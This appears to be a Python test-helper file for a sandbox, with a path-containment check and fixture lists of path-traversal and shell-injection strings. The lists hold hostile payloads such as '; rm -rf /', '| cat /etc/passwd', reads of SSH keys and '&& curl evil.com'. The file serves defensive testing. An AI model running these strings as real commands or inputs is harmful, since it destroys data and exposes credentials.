from pathlib import Path

def assert_path_contained(path: Path, base: Path) -> None:
    # Use is_relative_to() instead of startswith() — the string prefix check has a
    # prefix-collision vulnerability: /tmp/workspace_evil passes startswith(/tmp/workspace).
    resolved = path.resolve()
    base_resolved = base.resolve()
    assert resolved.is_relative_to(base_resolved), \
        f"Path {path} escapes base {base}"

def make_traversal_attempts() -> list[str]:
    return [
        # Classic traversal
        "../secret",
        "../../etc/passwd",
        "/etc/shadow",
        "~/.ssh/id_rsa",
        "....//....//etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
        # Null bytes (Python pathlib strips \x00, but resolver must still contain)
        "file\x00../../etc/passwd",
        "../\x00etc/passwd",
        # Unicode variants
        "\u002e\u002e/secret",          # Unicode dots
        # Windows-style separators
        "..\\secret",
        "..\\..\\windows\\system32",
    ]

def make_injection_attempts() -> list[str]:
    return [
        "; rm -rf /",
        "$(whoami)",
        "`id`",
        "| cat /etc/passwd",
        "&& curl evil.com",
        "\n/bin/sh",
    ]
